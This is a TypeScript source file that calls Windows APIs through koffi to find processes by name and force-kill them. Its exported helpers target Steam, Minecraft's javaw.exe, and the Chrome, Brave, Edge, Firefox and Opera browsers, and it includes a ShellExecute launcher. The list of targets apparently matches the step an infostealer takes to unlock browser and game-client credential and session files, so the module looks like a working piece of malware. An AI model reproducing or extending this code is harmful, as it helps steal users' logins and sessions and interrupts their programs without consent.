import koffi from 'koffi';

const kernel32 = koffi.load('kernel32.dll');
const shell32 = koffi.load('shell32.dll');
const HANDLE = koffi.pointer('void');
const TH32CS_SNAPPROCESS = 0x00000002;
const PROCESS_TERMINATE = 0x0001;

const ShellExecuteA = shell32.func('__stdcall', 'ShellExecuteA', HANDLE, [HANDLE, 'str', 'str', 'str', 'str', 'int']);

const PROCESSENTRY32 = koffi.struct({
    dwSize: 'uint32_t',
    cntUsage: 'uint32_t',
    th32ProcessID: 'uint32_t',
    th32DefaultHeapID: 'uintptr_t',
    th32ModuleID: 'uint32_t',
    cntThreads: 'uint32_t',
    th32ParentProcessID: 'uint32_t',
    pcPriClassBase: 'int32_t',
    dwFlags: 'uint32_t',
    szExeFile: koffi.array('char', 260)
});

const CreateToolhelp32Snapshot = kernel32.func('__stdcall', 'CreateToolhelp32Snapshot', HANDLE, ['uint32_t', 'uint32_t']);
const Process32First = kernel32.func('__stdcall', 'Process32First', 'int', [HANDLE, koffi.pointer(PROCESSENTRY32)]);
const Process32Next = kernel32.func('__stdcall', 'Process32Next', 'int', [HANDLE, koffi.pointer(PROCESSENTRY32)]);
const OpenProcess = kernel32.func('__stdcall', 'OpenProcess', HANDLE, ['uint32_t', 'int', 'uint32_t']);
const TerminateProcess = kernel32.func('__stdcall', 'TerminateProcess', 'int', [HANDLE, 'uint32_t']);
const CloseHandle = kernel32.func('__stdcall', 'CloseHandle', 'int', [HANDLE]);

function getProcessIdsByName(name: string): number[] {
    const pids: number[] = [];
    const hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (!hSnapshot) return pids;

    const peSize = koffi.sizeof(PROCESSENTRY32);
    const peBuf = Buffer.alloc(peSize);
    peBuf.writeUInt32LE(peSize, 0);

    if (Process32First(hSnapshot, peBuf)) {
        do {
            const pe = koffi.decode(peBuf, PROCESSENTRY32);
            const exeName = Buffer.from(pe.szExeFile).toString().split('\0')[0];
            if (exeName.toLowerCase() === name.toLowerCase()) {
                pids.push(pe.th32ProcessID);
            }
        } while (Process32Next(hSnapshot, peBuf));
    }
    CloseHandle(hSnapshot);
    return pids;
}

function nativeKill(pid: number): boolean {
    const hProcess = OpenProcess(PROCESS_TERMINATE, 0, pid);
    if (!hProcess) return false;
    const res = TerminateProcess(hProcess, 9);
    CloseHandle(hProcess);
    return !!res;
}

export async function terminateProcesses(processNames: string[]): Promise<void> {
    for (const processName of processNames) {
        const pids = getProcessIdsByName(processName);
        for (const pid of pids) {
            nativeKill(pid);
        }
    }
}

export async function killProcess(processName: string): Promise<void> {
    const name = processName.endsWith('.exe') ? processName : processName + '.exe';
    const pids = getProcessIdsByName(name);
    for (const pid of pids) {
        nativeKill(pid);
    }
}

export async function killSteam(): Promise<void> {
    const pids = getProcessIdsByName('Steam.exe');
    for (const pid of pids) nativeKill(pid);
}

export async function killMinecraft(): Promise<void> {
    const pids = getProcessIdsByName('javaw.exe');
    for (const pid of pids) nativeKill(pid);
}

export function killBrowsersSync(): void {
    const browsers = ['chrome.exe', 'brave.exe', 'msedge.exe'];
    for (const browser of browsers) {
        const pids = getProcessIdsByName(browser);
        for (const pid of pids) nativeKill(pid);
    }
}

export function killFirefox(): void {
    const pids = getProcessIdsByName('firefox.exe');
    for (const pid of pids) nativeKill(pid);
}

export function killOpera(): void {
    const pids = getProcessIdsByName('opera.exe');
    for (const pid of pids) nativeKill(pid);
    const pidsGX = getProcessIdsByName('operagx.exe');
    for (const pid of pidsGX) nativeKill(pid);
}
export function startProcess(exePath: string, args: string): void {
    ShellExecuteA(null, "open", exePath, args, null, 1);
}
